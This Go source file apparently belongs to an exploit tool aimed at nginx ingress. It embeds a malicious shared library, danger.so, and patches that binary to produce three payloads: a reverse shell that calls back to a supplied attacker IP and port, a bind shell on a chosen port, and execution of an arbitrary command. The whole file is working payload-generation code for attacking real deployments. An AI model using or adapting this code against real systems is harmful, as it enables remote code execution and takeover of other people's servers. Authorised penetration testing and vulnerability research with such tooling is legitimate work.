package nginx_ingress

import (
	"bytes"
	"embed"
	log "github.com/sirupsen/logrus"
	"strings"
)

func bytesReplace(s, old, new []byte, n int) []byte {
	if len(old) != len(new) {
		panic("bytes: unequal old and new byte slices! patched failed")
	}
	return bytes.Replace(s, old, new, n)
}

//go:embed danger.so
var evilLibraryFS embed.FS

var evilLibrary []byte

func Init() {
	evilLibrary, _ = evilLibraryFS.ReadFile("danger.so")
	log.Tracef("Load evil so library. size: %v bytes, prefix: %v(%X)", len(evilLibrary), evilLibrary[:32], evilLibrary[:32])
}

type Payload []byte

const (
	MODE_CHECK_FLAG = "MODE_CHECK_FLAG"
	MODE_REVERSE_SH = "MODE_REVERSE_SH"
	MODE_BINDING_SH = "MODE_BINDING_SH"
	MODE_CMD_EXECVE = "MODE_CMD_EXECVE"
)

func NewReverseShellPayload(tip string, port string) Payload {
	var ip []string
	for _, part := range strings.Split(tip, ".") {
		if len(part) == 1 {
			part = "00" + part
		} else if len(part) == 2 {
			part = "0" + part
		}
		ip = append(ip, part)
	}
	payload := bytesReplace(evilLibrary, []byte("127.000.000.001"), []byte(strings.Join(ip, ".")), 1)
	switch len(port) {
	case 1:
		port = "0000" + port
	case 2:
		port = "000" + port
	case 3:
		port = "00" + port
	case 4:
		port = "0" + port
	default:
		port = port
	}
	payload = bytesReplace(payload, []byte("13337"), []byte(port), 1)
	payload = bytesReplace(payload, []byte(MODE_CHECK_FLAG), []byte(MODE_REVERSE_SH), 1)
	return payload
}

func NewBindShellPayload(port string) Payload {
	switch len(port) {
	case 1:
		port = "0000" + port
	case 2:
		port = "000" + port
	case 3:
		port = "00" + port
	case 4:
		port = "0" + port
	default:
		port = port
	}
	payload := bytesReplace(evilLibrary, []byte("31337"), []byte(port), 1)
	payload = bytesReplace(payload, []byte(MODE_CHECK_FLAG), []byte(MODE_BINDING_SH), 1)
	return payload
}

func NewCommandPayload(command string) Payload {
	if len(command) > 510 {
		return nil
	}
	cmd := []byte(command + " #")
	cmd = append(cmd, bytes.Repeat([]byte{0x41}, 512-len(cmd))...)
	payload := bytesReplace(evilLibrary, []byte("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"),
		[]byte(cmd), 1)
	payload = bytesReplace(payload, []byte(MODE_CHECK_FLAG), []byte(MODE_CMD_EXECVE), 1)
	return payload
}
